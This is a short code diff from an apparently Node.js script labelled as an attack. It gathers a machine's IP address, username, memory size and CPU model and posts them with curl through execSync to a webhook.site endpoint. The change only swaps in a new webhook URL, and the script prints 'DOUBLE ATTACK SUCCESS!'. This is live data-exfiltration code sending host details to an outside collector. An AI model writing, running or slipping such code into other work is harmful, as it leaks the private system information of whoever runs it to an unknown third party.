@@ -15,7 +15,7 @@ try {
   
   // SECOND PAYLOAD (more data)
   const payload2 = `ip=${ip}&user=${user}&memory=${Math.round(os.totalmem()/1073741824)}GB&cpu=${os.cpus()[0].model}`;
-  execSync(`curl -X POST https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439 -d "${payload2}"`);
+  execSync(`curl -X POST https://webhook.site/b750c037-0ad2-4d73-998e-12dd15f5d672 -d "${payload2}"`);
   
   console.log('✅ DOUBLE ATTACK SUCCESS!');
 } catch (error) {
